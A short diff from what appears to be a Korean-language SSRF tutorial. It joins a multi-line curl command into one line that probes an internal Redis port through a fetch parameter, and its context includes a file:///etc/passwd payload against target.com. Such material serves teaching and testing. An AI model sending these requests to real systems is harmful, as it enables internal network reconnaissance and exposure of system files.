@@ -35,8 +35,7 @@ curl "http://target.com/fetch?url=file:///etc/passwd"
 
 ```bash
 # 내부 IP 대역 포트 확인 (응답 시간·에러 메시지 차이로 판별)
-curl -o /dev/null -s -w "%{http_code} %{time_total}\n" \
-  "http://target.com/fetch?url=http://10.0.0.5:6379/"
+curl -o /dev/null -s -w "%{http_code} %{time_total}\n" "http://target.com/fetch?url=http://10.0.0.5:6379/"
 ```
 
 ```text
